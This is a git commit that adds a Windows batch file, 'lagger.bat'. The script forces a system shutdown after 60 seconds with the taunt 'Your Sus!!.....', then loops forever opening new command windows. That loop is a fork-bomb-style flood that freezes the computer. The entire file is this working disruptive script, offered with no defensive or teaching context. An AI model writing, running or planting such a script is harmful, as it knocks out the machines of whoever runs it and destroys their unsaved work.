f0307fda3d5f7f3fa976cfe24f4a61854f000d06
LetGoYArn <105838665+LetGoYArn@users.noreply.github.com>
2022-05-19 13:08:36 +0800

    Create lagger.bat

---
+++ lagger.bat
@@ -0,0 +1,39 @@
+@echo off
+shutdown.exe -s -c "Your Sus!!....." -t 60
+}
+:A
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+Start
+goto a
